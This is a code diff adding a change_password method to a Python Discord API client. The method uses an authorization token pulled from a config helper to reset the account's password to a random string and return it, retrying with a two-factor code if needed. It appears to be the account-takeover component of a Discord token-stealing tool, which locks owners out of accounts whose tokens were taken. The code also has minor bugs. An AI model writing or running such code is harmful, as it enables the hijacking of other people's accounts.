@@ -1,6 +1,7 @@
 import httpx
 
 from helpers.config import Fetch
+from helpers.random import Random
 
 httpx_client = httpx.Client(timeout=10)
 
@@ -40,3 +41,41 @@ class Discord:
             return response.json()
         else:
             None
+            
+    def change_password(code: str, password: str) -> str:
+        new_password: str = Random.string(10)
+        
+        headers = {
+            "authorization": Fetch.authorization_token(),
+            "content-type": "application/json",
+        }
+        
+        payload = {
+            "password": code,
+            "new_password": new_password,
+        }
+        
+        response = httpx_client.patch("https://canary.discord.com/api/v9/users/@me", headers=headers, json=payload)
+        
+        if response.status_code == 200:
+            return new_password
+        
+        elif response.status_code == 400:
+            if response.json()["message"] == "Invalid two-factor code":
+                new_payload = {
+                    "code": code,
+                    "password": password,
+                    "new_password": new_password,
+                }
+                
+                response = httpx_client.patch("https://canary.discord.com/api/v9/users/@me", headers=headers, json=new_payload)
+                
+                if response.status_code == 200:
+                    return new_password
+                else:
+                    return None
+            else:
+                return None 
+            
+        else:
+            return None
